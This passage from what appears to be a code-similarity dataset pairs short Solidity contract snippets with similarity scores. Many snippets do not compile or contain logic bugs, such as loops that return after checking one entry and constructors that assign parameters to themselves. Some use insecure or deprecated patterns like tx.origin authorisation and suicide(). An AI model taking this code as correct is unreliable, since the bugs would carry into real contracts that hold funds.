            if(!creator.send(totalAmount)) {
                return false;
            }
        }
    }
}",0.6234823378317305,"contract EtherTransferTo{

    address public owner;

    

    constructor() public {

    owner = msg.sender;

  }

  

    modifier onlyOwner() {

        require (msg.sender == owner);

        _;



    }

    

    function () payable public {

        

    }

    

    function getBalance() public view returns (uint256) {

        return address(this).balance;

    }

    

    function withdraw(uint amount) onlyOwner returns(bool) {

        require(amount <= this.balance);

        owner.transfer(amount);

        return true;



    }

    



}"
"contract Greeter         
{
    address creator;     
    string greeting;     

    function Greeter(string _greeting) public   
    {
        creator = msg.sender;
        greeting = _greeting;
    }

    function greet() constant returns (string)          
    {
        return greeting;
    }

    function getBlockNumber() constant returns (uint) 
    {                                                   
        return block.number;
    }

    function setGreeting(string _newgreeting) 
    {
        greeting = _newgreeting;
    }


    function kill()
    { 
        if (msg.sender == creator)  
            suicide(creator);       
    }

}",0.6561070318096199,"contract PiggyBank
{
    address creator;
    uint deposits;

    
    function PiggyBank() public
    {
        creator = msg.sender;
        deposits = 0;
    }

    function() payable
    {
        deposit();
    }

    function deposit() payable returns (uint)
    {
        if( msg.value > 0 )
            deposits = deposits + 1;

        return getNumberOfDeposits();
    }

    function getNumberOfDeposits() constant returns (uint)
    {
        return deposits;
    }

    function kill()
    {
        if( msg.sender == creator )
            selfdestruct(creator);
    }
}"
"contract HelloWorld {
    uint public balance;

    function HelloWorld(){
             balance=1000;
    }
    function deposit(uint _value) returns (uint _newValue){
             balance += _value;
             return balance;    
    }
}",0.6722878318804777,"contract ERC20 {
  function balanceOf(address _owner) public constant returns (uint balance);
  function transfer(address _to, uint _value) public returns (bool success);
}"
"contract Token{
    function Token(tokenName,tokenValue,totalSupply){
      
    } 
    function transfer(address to,uint amount){
       
    }
  }",0.6843083334432706,"contract token { function transfer(address receiver, uint amount);
                 function balanceOf(address addr);
                }"
"contract crowdfunding{
   Token token;
    function crowdfunding(address tokenAddr){
    token = Token(tokenAddr)
    }
    function contribute(){
    token.transfer(msg.sender,amount);
    
    }
}",0.6098774216912913,"contract TokenRescue {
    
    function rescueToken(ERC20 _token)
    external
    {
        _token.transfer(msg.sender, _token.balanceOf(this));
    }
    
    function() external payable {
        revert();
    }
}"
"contract MetaCoin {
        uint public balance;

        function MetaCoin(){
            balance = 1000;
        }
    }",0.655710046302995,"contract Token {

  function balanceOf (address) public view returns (uint);

}"
"contract CompositeManager {
    uint private conType;

     
    function getType() external view 
                       returns(uint)
    {
        return conType;
    }

    constructor(uint _type) public {
        conType = _type;
    }
}",0.6598920284164543,"contract Counter {

   uint256 c;



   constructor() public {

       c = 1;

   }   

   function inc() external {

        c = c + 1;

   }

   function get() public view returns (uint256)  {

       return c;

   }

}"
"contract CrowdFunder {

    function contribute()
    public
    inState(State.Fundraising) payable returns (uint256)
    {
        contributions.push(
            Contribution({
                amount: msg.value,
                contributor: msg.sender
                })
            );
        totalRaised += msg.value;
        currentBalance = totalRaised;
        LogFundingReceived(msg.sender, msg.value, totalRaised);
        checkIfFundingCompleteOrExpired();
        return contributions.length - 1;
    }
}",0.6015177911439867,"contract Proxy {

    using SafeMath for uint256;

    uint256 public contribution = 0;

    Lottery lottery;

    

    constructor() public {

        lottery = Lottery(msg.sender);

    }

    function() public payable {

        contribution = contribution.add(msg.value);

        address(lottery).transfer(msg.value);

    }

    function resetContribution() external {

        require(msg.sender == lottery.owner());

        contribution = 0;

    }

}"
"contract test {
    mapping (uint => address) public testmap;

    function add_to_map  (uint _key, address _val) public{
        testmap[_key] = _val;
    }
    function get_from_map(uint _key) returns (address){
        return testmap[_key];
    }   
}",0.6775072561254198,"contract VatLike {
    function ilks(bytes32) public view returns (uint, uint, uint, uint, uint);
    function hope(address) public;
    function frob(bytes32, address, address, address, int, int) public;
}"
"contract Storage{
    uint id;
    uint status;

    function setId(uint mid){
        id=mid;
    }
    function setStatus(uint mStatus){
        status=mStatus;
    }

}",0.6332432539619502,"contract FiatContract {

    function ETH(uint _id) constant returns (uint256);

    function USD(uint _id) constant returns (uint256);

}"
"contract Person {

    
    address private owner;

    
    string private firstName;
    string private lastName;
    string private SID; 

    constructor(string memory _firstName, string memory _lastName, string memory _SID) public {
        owner = msg.sender;
        firstName = _firstName;
        lastName = _lastName;
        SID = _SID;
    }

    modifier checkAccess(){
        require(this.getAccess() == true);
        _;
    }

    function getAccess() public view returns(bool access){
        
        return msg.sender == owner;
    }

    function getFirstName() public view checkAccess returns (string memory _firstName){
        _firstName = firstName;
    }
    function getLastName() public view returns (string memory _lastName){
        _lastName = lastName;
    }
    function getSID() public view returns (string memory _SID){
        _SID = SID;
    }
}",0.6044314992409546,"contract PedigreeFactory {



    address public owner;

    

    mapping (address => address[]) list;

    

    constructor() public{

        owner = msg.sender;

    }



    function createPedigreeWithParent(address _father, address _mother, string _name, bool _gender, string _birthday, string _ipfs) public returns ( Pedigree ) {

        Pedigree newPedigree = new Pedigree(msg.sender, _father, _mother, _name, _gender, _birthday, _ipfs);

        list[msg.sender].push(newPedigree);

        return newPedigree;

    }



    function getList() public view returns(address[]){

        return list[msg.sender];

    }

    

    

    function () public payable{

    }

    

    function widthdraw() external payable{

        require( msg.sender == owner );

        msg.sender.transfer(address(this).balance);

    }

    

    function getContractBalance() external view returns(uint) {

        return address(this).balance;

    }

}"
"contract simpleSmartContract{

 address public inventor;
 string public message;

 constructor() public
 {
     inventor = msg.sender;
 }

 function changeMessage(string memory message_) public returns(string memory)
 {
     message = message_;
     return message;
 }   

}",0.6265175337389887,"contract ZZ
{
    address creator;
    function ZZ() public payable {
        creator = msg.sender;
    }

    function getMessage() public pure returns (bytes32) {
        return ""ZZ loves mandy."";
    }
  
    function e() public { 
        if (msg.sender == creator)
            selfdestruct(creator);
    }
}"
"contract ERC725 {
    uint256 constant MANAGEMENT_KEY = 1;



    
    event KeyAdded(
        bytes32 indexed key,
        uint256 indexed purpose,
        uint256 indexed keyType
    );
    event KeyRemoved(
        bytes32 indexed key,
        uint256 indexed purpose,
        uint256 indexed keyType
    );
    event ExecutionRequested(
        uint256 indexed executionId,
        address indexed to,
        uint256 indexed value,
        bytes data
    );
    event Executed(
        uint256 indexed executionId,
        address indexed to,
        uint256 indexed value,
        bytes data
    );
    event Approved(uint256 indexed executionId, bool approved);

    struct Key {
        uint256 purpose;
        uint256 keyType;
        bytes32 key;
    }


    
    function getKey(bytes32 _key)
        public
        view
        returns (uint256 purpose, uint256 keyType, bytes32 key);

    
    function getKeyPurpose(bytes32 _key) public view returns (uint256 purpose);

    
    function getKeysByPurpose(uint256 _purpose)
        public
        view
        returns (bytes32[] memory keys);

    
    function addKey(bytes32 _key, uint256 _purpose, uint256 _keyType)
        public
        returns (bool success);

    function execute(address _to, uint256 _value, bytes memory _data)
        public
        returns (uint256 executionId);

    function approve(uint256 _id, bool _approve) public returns (bool success);

}",0.6630029949987747,"contract ERC1132 {
    
    mapping(address => bytes32[]) public lockReason;

    
    struct lockToken {
        uint256 amount;
        uint256 validity;
        bool claimed;
    }

    
    mapping(address => mapping(bytes32 => lockToken)) public locked;

    
    event Locked(
        address indexed _of,
        bytes32 indexed _reason,
        uint256 _amount,
        uint256 _validity
    );

    
    event Unlocked(
        address indexed _of,
        bytes32 indexed _reason,
        uint256 _amount
    );
    
    
    function lock(bytes32 _reason, uint256 _amount, uint256 _time)
        public returns (bool);
  
    
    function tokensLocked(address _of, bytes32 _reason)
        public view returns (uint256 amount);
    
    
    function tokensLockedAtTime(address _of, bytes32 _reason, uint256 _time)
        public view returns (uint256 amount);
    
    
    function totalBalanceOf(address _of)
        public view returns (uint256 amount);
    
    
    function extendLock(bytes32 _reason, uint256 _time)
        public returns (bool);
    
    
    function increaseLockAmount(bytes32 _reason, uint256 _amount)
        public returns (bool);

    
    function tokensUnlockable(address _of, bytes32 _reason)
        public view returns (uint256 amount);
 
    
    function unlock(address _of)
        public returns (uint256 unlockableTokens);

    
    function getUnlockableTokens(address _of)
        public view returns (uint256 unlockableTokens);

}"
"contract AssetPrices {
  mapping (uint => uint) public prices;
  uint public data;

  function EnterPrice(uint _time, uint _price){
  prices[_time] = _price;
  }

  function GetPrice(uint _time) returns (uint){
  data = prices[_time];
  return data;
  }

}",0.6311043132146245,"contract DateTime {
        function getYear(uint timestamp) public constant returns (uint16);
        function getMonth(uint timestamp) public constant returns (uint8);
        function getDay(uint timestamp) public constant returns (uint8);
}"
"contract signature
{
    event ret_addr(address addr);
    function sig_verify(bytes32 hash, bytes sig) returns(address)                       
    {
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly 
        {
                r := mload(add(sig, 32))
                s := mload(add(sig, 64))
                v := byte(0, mload(add(sig, 96)))
            }
        if(v<27)
            v+=27;
        ret_addr(ecrecover(hash, v, r, s));
    }
}",0.6166643999544561,"contract Origin {

function getOriginAddress(bytes32 signedMessage, uint8 v, bytes32 r, bytes32 s) constant returns(address) {

  bytes memory prefix = ""\x19Ethereum Signed Message:\n32"";

  bytes32 prefixedHash = keccak256(prefix, signedMessage);

  return ecrecover(prefixedHash, v, r, s);

}

}"
"contract Derived is Base {
    uint256 public f;
}",0.6299592800625574,"contract PriceOracle {

    

    uint256 public priceUSDcETH;

}"
"contract FooContract{

    address myAddress = ??
}",0.6175856171004578,"contract ProxyStorage {

  
  address currentContract;

}"
"contract OutOfBoundsException {
    uint256[8] public array;
}",0.602907064516469,"contract TOP {
    function caged() public returns(uint256);
}"
"contract test{
    function display() public returns (string){
       return ""message"";
    }   
 }",0.6825474164410447,"contract web3Voorbeeld {

    

    

    function ping() public view returns(string) {

        return(""pong"");

    }

}"
"contract test2 {

    bytes32 public _id;

    event LogTestCase(
        bytes32 _id
    );

    function setID(bytes32 cId) returns (bool){
        _id = cId;
        emit LogTestCase(_id);
        return true;
    }
}",0.6219642510238864,"contract Validator {

    function verify(bytes32 r, bytes32 s, uint8 v, bytes32 messageHash) public pure returns (address) {

        return ecrecover(messageHash, v, r, s);

    }

}"
contract at address {},0.6943273848296024,"contract TeamAddress {



}"
"contract MyNewTest {

Student[] students;
mapping (string => uint) nametonumber;
mapping (uint => string) numbertoname;
uint counter;

struct Student
{
    string name;
    uint num;
}

function addStudent(string _name)
{
    uint _id;
    _id = students.length++;
    students[_id].name = _name;
    students[_id].num = _id;
    numbertoname[_id] = _name;
    nametonumber[_name] = _id;
}

function getLength() constant
returns (uint)
{
    return students.length;
}

function getStudentNumber(string name) constant
returns (uint)
{
    return nametonumber[name];
}

function getStudentName(uint number) constant
returns (string)
{
    return numbertoname[number];
}

function getStudentAtPosition(uint x) constant
returns (string)
{
    return students[x].name;
}

function getStudentNumberAtPosition(uint x) constant
returns (uint)
{
    return students[x].num;
}
}",0.6108543958368778,"contract Token
{
	string internal _symbol;
	string internal _name;
	uint8 internal _decimals;	
    uint internal _totalSupply;
   	mapping(address =>uint) internal _balanceOf;
	mapping(address => mapping(address => uint)) internal _allowances;

    function Token(string symbol, string name, uint8 decimals, uint totalSupply) public{
	    _symbol = symbol;
		_name = name;
		_decimals = decimals;
		_totalSupply = totalSupply;
    }

	function name() public constant returns (string){
        	return _name;    
	}

	function symbol() public constant returns (string){
        	return _symbol;    
	}

	function decimals() public constant returns (uint8){
		return _decimals;
	}

	function totalSupply() public constant returns (uint){
        	return _totalSupply;
	}
            	
	event Transfer(address indexed _from, address indexed _to, uint _value);	
}"
"contract hcare

{
    struct block 
    {
            string fileHash;
            uint numRecv;
            address[] recvAddress;
    }

    uint i;
    uint recvCount;
    
    address owner;
    block temp;
     
    block[] Blocks; 

    event fileUploaded (address sender , uint cnt);

    function hcare()
    {
            owner = msg.sender;

    }

    function addBlock (string fHash, address[] recvAddr) public
    {


            

            Blocks.push(block(fHash , recvAddr.length , recvAddr));
            fileUploaded (msg.sender, Blocks.length);
    }

    function getBlockCount() public constant returns (uint)
    {
        return Blocks.length;
    }



    function getFileHash () public constant returns(string)
    {
            string tempFHash;  
            uint ctr=0;
            uint i;
            uint j;

            for (i=0; i < Blocks.length;i++)
            {
                    for ( j=0; j<Blocks[i].recvAddress.length;j++)
                    {
                            if (Blocks[i].recvAddress[j] == msg.sender)
                            {
                                    tempFHash = Blocks[i].fileHash;
                                    ctr = 1;

        

                             }
                    }
            }        
            if(ctr == 1)
            return tempFHash;
            else
            return ""error"";
        }
    }",0.6019905303184682,"contract ERC20 {

    string public name;

    string public symbol;

    uint8 public decimals;

    uint public totalSupply;

    constructor(string _name, string _symbol, uint8 _decimals) public {

        name = _name;

        symbol = _symbol;

        decimals = _decimals;

    }

    function balanceOf(address who) public view returns (uint);

    function transfer(address to, uint value) public returns (bool);

    function allowance(address owner, address spender) public view returns (uint);

    function transferFrom(address from, address to, uint value) public returns (bool);

    function approve(address spender, uint value) public returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);

    event Approval(address indexed owner, address indexed spender, uint value);

}"
"contract Calculator{

    uint result=10;

    function Calculator() public
    {

    }

    function getResult() public view returns (uint)
    {
        return result;
    }

    function addition(uint num) public
    {
        result=result+num;

    }

    function sub(uint num) public
    {
        result = result - num;
    }

    function mult(uint num) public
    {
        result =result*num;
    }

    function div(uint num) public
    {
        result = result/num;
    }

    }",0.6469284871859077,"contract VatLike {
    function urns(bytes32, address) public view returns (uint, uint);
    function hope(address) public;
    function flux(bytes32, address, address, uint) public;
    function move(address, address, uint) public;
    function frob(bytes32, address, address, address, int, int) public;
    function fork(bytes32, address, address, int, int) public;
}"
"contract Election {
    mapping(uint => UserRequest) public userRequest;
    
    address payable chairman;

    
    constructor () public payable {
        chairman = msg.sender;
    }

    function register() public payable{
        chairman.transfer(1 ether);
    }
}",0.6361246746258608,"contract dubbel {

    address public previousSender;

    uint public price = 0.001 ether;

    

    function() public payable {

            require(msg.value == price);

            previousSender.transfer(msg.value);

            price *= 2;

            previousSender = msg.sender;

    }

}"
"contract MyFirstContract{
    string private name;
    uint private age;

    function setName(string newName){
        name = newName;
    }

   function getName()returns (string){
        return name;
    }

    function setAge(uint newAge){
        age = newAge;
    }

    function getAge()returns (uint){
        return age;
    }
}",0.6182180417011154,"contract ENSResolver {

    function addr(bytes32 _node) public view returns (address);

    function setAddr(bytes32 _node, address _addr) public;

    function name(bytes32 _node) public view returns (string);

    function setName(bytes32 _node, string _name) public;

}"
"contract testCoin {

Value value;

function getVal() view public returns (uint){
    return value.testValue();
}
}",0.6912582550748783,"contract Balance {

    function getBalance(address a) public view returns (uint) {

        return a.balance;

    }

}"
"contract Name is mortal{

    mapping(address=>string) public text;
    string public test;

    function register(string _text){
        text[msg.sender]    = _text;
    }
}",0.6755135550357297,"contract ProofOfAddress {

    mapping (address=>string) public proofs;



    function register(string memory kinAddress) public{

        proofs[msg.sender] = kinAddress;

    }

}"
"contract TEST{
string public note=""Yerevan is love"";
function rep() public view returns(string memory){
return note;
}
}",0.6542430192326285,"contract DSValue {

    

    function peek() public view returns (bytes32, bool);



    function read() public view returns (bytes32);

}"
"contract IScoreStore{
    function GetScore(string name) returns (int);
}",0.6182700522678706,"contract IShares {
    function totalShares() public returns (uint256);
}"
"contract MultiSend
{
    function multiSendETH(address[] memory addresses, uint[] memory values) public payable
    {
        
        if(addresses.length != values.length)
        {
            return;
        }

        else
        {
            for(uint i = 0; i < addresses.length; i++)
            {
                address(addresses[i]).transfer(values[i]);
            }

            msg.sender.transfer(this.balance);
        }
    }
}",0.6803891285940203,"contract Multisend {
   
function multisend(uint256[] memory amounts, address payable[] memory receivers) payable public {
assert(amounts.length == receivers.length);
assert(receivers.length <= 100); 
   
        for(uint i = 0; i< receivers.length; i++){
            receivers[i].transfer(amounts[i]);
        }
    }
}"
"contract SampleContract{

     address payable owner = msg.sender;

}",0.6333432892591093,"contract ownedContractInterface

{

  address public owner;



}"
"contract T2{
 uint public k;
 event CheckVal(uint val);
 function Test() returns (uint){        
  var temp=441;
  CheckVal(temp);
  k=32; 
  return temp;
   }    
}",0.6327286547946613,"contract testabi {

    uint c;

    function tinhtong(uint a, uint b) public {

        c = a+b;

    } 

    function ketqua() public view returns (uint) {

        return c;

    }

}"
"contract sample{
    uint number;
    function setNumber(uint _number) public{
        number = _number;
    }
    function getNumber() view public returns(uint){
        return number;
    }
}",0.6988082631182096,"contract iGames {

    function processRound(uint round, uint randomNumber) public payable returns (bool);

    function getPeriod() public view returns (uint);

}"
"contract BankA{
  function pay() public returns(uint256){
    customer client=new customer();
    address(client).transfer(1000);
    return address(client).balance;
  }
  function() external payable{}

  }",0.6759003799977416,"contract ERC20{
    function transfer(address recipient, uint256 amount) external returns (bool);
     function balanceOf(address account) public view returns (uint256);
}"
"contract C {
    function a(uint x){}
}",0.6893623937646356,"contract test {
    function f() public { }
}"
"contract greeter{   
}",0.6703681862564034,contract OneLiner {}
"contract YourContract {

    
    
    
    string public Name;
    string public Type;
    uint public Fee;
    address owner;

    
    
    
    constructor(string memory Name, string memory Type, uint Fee) public {
        owner = msg.sender;
        Name = Name;
        Type = Type;
        Fee = Fee;
    }",0.6718603441526901,"contract CrowdsaleTokenConstructor is iToken {

  string public name;

  string public symbol;

  uint8 public constant decimals = 18;



  constructor(string _name, string _symbol, address _owner) public {

    name = _name;

    symbol = _symbol;

    owner = _owner;

  }

}"
"contract HelloWorld {
    uint num;
    function get(uint val) public returns (string memory){
        num = val;
        return ""Hello Solidity"";
    }
}",0.6266152295144292,"contract Token{

function transfer(address to, uint value) public returns (bool);

function decimals() public returns (uint);

}"
"contract owned {
    address public owner;
    mapping (address => bool) public permittedContracts;
    function owned(){
        owner = msg.sender;
    }
    modifier onlyOwner{
        if(msg.sender != owner){
            throw;
        }
        _;
    }
    function transferOwnership (address newOwner) onlyOwner{
        owner = newOwner;
    }
    function addPermittedContract(address newPermittedContract)onlyOwner{
        if(permittedContracts[newPermittedContract]==true){
            throw;
        }
        permittedContracts[newPermittedContract]=true;
    }
    function removePermittedContract(address oldPermittedContract)onlyOwner{
        if(permittedContracts[oldPermittedContract]!=true){
            throw;
        }
        permittedContracts[oldPermittedContract]=false;
    }
    modifier onlyPermittedContracts{
        if(permittedContracts[msg.sender]!= true){
            throw;
        }
        _;
    }
}",0.6099345328335144,"contract Owned {
    
    address public owner;
    mapping(address => bool) public owners;

    function Owned() public {
        owner = msg.sender;
        owners[msg.sender] = true;
    }

    modifier onlyOwners{
        address sen = msg.sender;
        require(owners[msg.sender] == true);
        _;
    }

    modifier onlyOwner{
        require(msg.sender == owner);
        _;
    }

    modifier onlyOwnerOrigin{
        require(tx.origin == owner);
        _;
    }

    function addOwner(address newOwner) public onlyOwners{
        owners[newOwner] = true;
    }

    function removeOwner() public onlyOwners{
        owners[msg.sender] = false;
    }

    function removeOwner(address newOwner) public onlyOwner{
        owners[newOwner] = false;
    }

    function isOwner(address o) public view returns(bool){
        return owners[o] == true;
    }
}"
"contract Student
{
uint256 index=0;
function Students(bytes32 name, uint256 adNo) returns (uint256 vid)
{
index++;
Name[index]=name;
AdmissionNo[index]=adNo;
vid=index;
}
mapping(uint256 => bytes32) public Name;
mapping(uint256 => uint256) public AdmissionNo;
}",0.6138694674168161,"contract Vat {
    struct Urn {
        uint256 ink;   
        uint256 art;   
    }

    struct Ilk {
        uint256 Art;   
        uint256 rate;  
        uint256 spot;  
        uint256 line;  
        uint256 dust;  
    }

    mapping (bytes32 => mapping (address => Urn )) public urns;
    mapping (bytes32 => Ilk)                       public ilks;
}"
"contract Test{
   function getAandB( uint x )returns ( uint a, uint b ){

       uint y = x * 2 ;
       return ( x , y )
   }
   }",0.6978745974570058,"contract Ceil {

    

    

    function ceil(uint a, uint m) constant returns (uint ) {

        return ((a + m - 1) / m) * m;

    }

    

    

}"
"contract AttrFnDemo{
    uint private _age;
    string internal _name;
    int public _num;

    function age() private view return (unit)
    {
        return _age;
    }
    function age() internal return (string){
        return _name;
    }
    function age() private return (int){
        return _num;
    }
}",0.6154175917509284,"contract IERC721Metadata is IERC721 {

  function name() external view returns (string memory name);

  function symbol() external view returns (string memory symbol);

  function tokenURI(uint256 tokenId) public view returns (string memory uri);

}"
"contract Ballot {

   function sendRequestToPay( uint256 etheramount1,address receiver) payable{

                  receiver.transfer(etheramount1);
     }
 }",0.6077291473848152,"contract IToken {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}"
"contract Factory {

 function createContract() returns (address created){

  return new MyBasicContract();

 }

}",0.6400839815835316,"contract ResolverClient {

  

  

  

  function get_contract(bytes32 _key) public constant returns (address _contract);

}"
"contract EMBallot {

address[] whiteList;
 struct Proposal {
    uint voteCount;
    string description;
}
 struct Voter {
    bool voted;
    uint8 vote;
    string name;
}
Proposal[] proposals;  

address admin; 
mapping(address => Voter) voters;
and Voter structs(objects) are the values. 

function EMBallot() public{
admin = msg.sender;
}

function getWhiteListLength() constant returns(uint256){
    return whiteList.length;
}

function amIWhitelisted(address myAddress) constant returns(bool){
for(uint i=0; i<=whiteList.length; i++){
if(myAddress == whiteList[i]){
return true;
break;
}
return false;
}}

function addToWhiteList (address voter){
whiteList.push(voter);   
}
}",0.6145872314806028,"contract ERC223Interface {
       uint public totalSupply;
       function totalSupply() constant  returns (uint256 _supply);
	   function name() constant  returns (string _name);
	   function symbol() constant  returns (string _symbol);
	   function decimals() constant  returns (uint8 _decimals);
	   function balanceOf(address who) constant returns (uint);
	   function transfer(address to, uint value);
	   
	   event Transfers(address indexed from, address indexed to, uint256 value);  
        event Transfer(address indexed from, address indexed to, uint value, bytes data);
    
	   event TokenFallback(address from, uint value, bytes _data);

}"
"contract Child {
    string public name;
    function child (string _name){
       name = _name;
    }
}",0.6420348924199566,"contract Resolver {
    function setName(bytes32 node, string memory name) public;
}"
"contract CrowdFactory {
  using sharedLib for sharedLib.Client; 
  using sharedLib for sharedLib.Projet;


  mapping(address => ClientSC) public usersinfo;  
  mapping (address=> sharedLib.Projet)public projectsinfo; 

 
 address[] public users; 
 address[] public clients;
 address[] public Projects; 


constructor () public {}




event registred(address contractAddress, address publickey, uint userId ) ;
event projectAdded(address contractAddress, address porteur, uint pID ) ;
event loggedin(address publickey , uint userId);




function isRegistred (address _userAddress) 
  internal 
  view   
  returns(bool){
    for(uint256 i = 0; i < users.length; i++){
      if(users[i] == _userAddress) return true;
      else         return false;
    }             
  }

 
 function Registration (uint _userId,  string memory _mail ,string memory _password)   
 public
 returns (ClientSC newClient )
 {
   require (!isRegistred(msg.sender));
   ClientSC newClient = new ClientSC  ( _userId, _mail , _password);
   usersinfo[msg.sender]= newClient;
   users.push(msg.sender);
   clients.push(address (newClient));
   emit registred(address(newClient),msg.sender, _userId);
   return (newClient) ;
 } ",0.6230145038278333,"contract TAO {

	using SafeMath for uint256;



	address public vaultAddress;

	string public name;				

	address public originId;		



	

	string public datHash;

	string public database;

	string public keyValue;

	bytes32 public contentId;



	

	uint8 public typeId;



	

	constructor (string memory _name,

		address _originId,

		string memory _datHash,

		string memory _database,

		string memory _keyValue,

		bytes32 _contentId,

		address _vaultAddress

	) public {

		name = _name;

		originId = _originId;

		datHash = _datHash;

		database = _database;

		keyValue = _keyValue;

		contentId = _contentId;



		

		typeId = 0;



		vaultAddress = _vaultAddress;

	}



	

	modifier onlyVault {

		require (msg.sender == vaultAddress);

		_;

	}



	

	function () external payable {

	}



	

	function transferEth(address payable _recipient, uint256 _amount) public onlyVault returns (bool) {

		_recipient.transfer(_amount);

		return true;

	}



	

	function transferERC20(address _erc20TokenAddress, address _recipient, uint256 _amount) public onlyVault returns (bool) {

		TokenERC20 _erc20 = TokenERC20(_erc20TokenAddress);

		_erc20.transfer(_recipient, _amount);

		return true;

	}

}"
"contract Betaal{
    address public bedrijf = addresBedrijf;

    function UitBetalen(){
        bedrijf.transfer(this.balance);
    }

    function ()payable{
    }
}",0.6322988993710532,"contract BurnableToken {
  function transferFrom(address, address, uint) public returns (bool);
  function burn(uint) public;
}"
"contract TCoin{
        mapping (address => uint256) public balanceOf;

        Function TCoin(int256 initialSupply) {
          
        }

        Function transfer(address _to, uint256 _value){
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        }
}",0.6833811345668287,"contract ERC20Basic {

  uint256 public totalSupply;

  function balanceOf(address who) public constant returns (uint256);

  function transfer(address to, uint256 value) public returns(bool);

}"
"contract TestCrowdsale is Crowdsale {

   function TestCrowdsale(uint256 _startTime, uint256 _endTime, uint256 _rate, address _wallet)
      Crowdsale(_startTime, _endTime, _rate, _wallet)
      public
      {
   }

}",0.6508147611818682,"contract WantMarketplacesUtilityTokenCrowdsale is Crowdsale {

  constructor(
    uint256 _rate,
    address payable _wallet,
    ERC20 _token,
    address _tokenWallet
  )
    Crowdsale(_rate, _wallet, _token)
    public
  {
  }
}"
"contract Time is owned {

    uint today;

    constructor() public {
       today = block.timestamp;
    } ",0.6109575694633606,"contract    Token  is  ERC20
{
    using SafeMath  for uint256;

    
    constructor()   public 
    {
    }
    
    
    
}"
"contract addition {

    address creator;
    uint a;
    uint b;
    uint c;

    function addition() public 
    {
        creator = msg.sender;                                
        uint c = uint a + uint b; 
    }

    function addition() constant returns (uint) 
    {
        return uint c;
    }

    

    function kill()
    { 
        if (msg.sender == creator)
            suicide(creator);  
    }

}",0.6604322574807137,"contract test{

    uint256 public i;

    address public owner;

    

    constructor() public{

        owner = msg.sender;

    }

    

    function add(uint256 a, uint256 b) public pure returns (uint256){

        return a + b;

    }

    

    function setI(uint256 m) public {

        require(msg.sender == owner, ""owner required"");

        i = m;

    }

}"
"contract Test {
  ERC721Token public tokenAddress;

  constructor(address _address) public {
    tokenAddress = ERC721Token(_address);
  }
}",0.6634789608528642,"contract ThisMustBeFirst {

  address public bts_address1;
  address public bts_address2;
  address public token_address;

}"
"contract SecondContract {
   function processdata(){
     
   }
}",0.6692490261736322,"contract MyContract {
    
    function MyContract() {

    }
}"
"contract Auction {

    
    
    struct Item {
        uint itemId; 
        uint[] itemTokens;  

    }

   
    struct Person {
        uint remainingTokens; 
        uint personId; 
        address addr;
    }

    mapping(address => Person) tokenDetails; 
    Person [4] bidders;

    Item [3] public items;
    address[3] public winners;
    address public beneficiary;

    uint bidderCount=0;

    

    function Auction() public payable{    
  ......................",0.6255616274225334,"contract ERC223Interface {
    uint public totalSupply;
    function balanceOf(address who) public view returns (uint);
    function transfer(address to, uint value) public;
    function transfer(address to, uint value, bytes memory data) public;
    event Transfer(address indexed from, address indexed to, uint value, bytes data);
}"
"contract HelloWorld {
    uint public balance;

    function Helloworld(){
        balance = 1000;
    }
}",0.637432560314889,"contract TokenStorage {
    function balances(address account) public returns(uint balance);
}"
"contract tokenX  {

bool public started = true;

function end()
{
started = false; 
}


}",0.6461761681507603,"contract Token {
  function transfer(address to, uint value) public returns (bool);
}"
"contract B {

uint public a;
A ac;

function(){
    a= 20;
}
constructor() payable {
    a=10;
}

function send(A b){
    b.call.gas(210000).value(100 wei)();    
} 

function getBalance() view returns(uint){
    return address(this).balance;    
}",0.6302399676995297,"contract ZethrInterface {

  function balanceOf(address who) public view returns (uint);

  function transfer(address _to, uint _value) public returns (bool);

	function withdraw(address _recipient) public;

}"
"contract A{
    function test() public view returns (bytes){
        bytes memory output = abi.encodePacked(bytes32(1));
        return output;
    }
}",0.6631379830779388,"contract DSValue {

    

    function peek() public view returns (bytes32, bool);



    function read() public view returns (bytes32);

}"
"contract SampleContract{
uint256 sampleVariable = 0;

    function setSample(uint256 x) public{
        sampleVariable = x;
    }
    function getSample() public view returns(uint256){
        return sampleVariable;
    }
}",0.6600943011046609,"contract CryptoArenaInterface {

    function getData(address ) public view returns(uint256 , uint256 , uint256 , bool    , uint256 , uint256 ) {}

    function isContractMiniGame() public pure returns( bool  ) {}

}"
"contract Ballot {
  uint8[] public proposals;
}",0.6976339742614955,"contract Precision {
  uint8 public decimals;
}"
"contract Contract2{

    Contract1 public c;

    function setContract(address payable _addr) public{

     c = Contract1(_addr);

    }

    function() external payable{



    }

    function sendEther() public payable{

        address(c).transfer(msg.value);

    }



}",0.6486703999660508,"contract Contract {

    bytes32 public Name;



    

    

    constructor(bytes32 _contractName) public {

        Name = _contractName;

    }



    function() public payable { }

    

    function sendFunds(address receiver, uint amount) public {

        receiver.transfer(amount);

    }    

}"
"contract attacker{ 

    constructor(address payable _vulnerableContract) public{
        vulnerable v = vulnerable(_vulnerableContract);
    }

    function deposit(address payable _addr) payable public{
        _addr.transfer(msg.value);
    }

    function() external payable{
       }

}",0.6880891440013734,"contract newC {
    function sendEth(address payable[] memory _addresses, uint256 _amount) public payable {
        for (uint i=0; i<_addresses.length; i++) {
            _addresses[i].transfer(_amount);
        }
    }
    constructor() public payable{}
    function () payable external{}
}"
"contract addThings{
    using Ops for *;

    function add(Ops.Point a, Ops.Point b) public returns (Ops.Point){
        return Ops.addition(a, b);
    }
}",0.6106909603862596,"contract LndrJPY {
    function allowTransaction(address creditor, address debtor, uint256 amount) public returns (bool) {
        return true;
    }
}"
"contract helloworld {

    function f() returns (uint){
    return 15;
    }

    }",0.6871316893228773,"contract DSTrueFallback {

    function() returns (bool) {

        return true;

    }

}"
"contract Election
{
    string public candidate;
    string public candidate1;

    constructor () public
    {
        candidate = ""A"";
        candidate1 = ""B"";
    }
}",0.6369708662550051,"contract DetailedERC20 is ERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;

    constructor() public {
        
    }

    
}"
"contract ArrayArgument {
    uint[] public arrsv;

    constructor(uint[] memory arr) public {
        for(uint i=0; i< arr.length; i++)
        {
            arrsv[i] = arr[i];
        }
    }

    function fetcharrayindexvalue(uint index) public view returns (uint)
    {
        return arrsv[index];
    }
}",0.6120977261812162,"contract balanceChecker {

    function checkBals(ERC20 _location, address[] addrs) public view returns(uint[]) {

        uint[] memory bals = new uint[](addrs.length);

        for (uint i=0; i < addrs.length; i++) {

            bals[i] = _location.balanceOf(addrs[i]);

        }

        return bals;

    }

}"
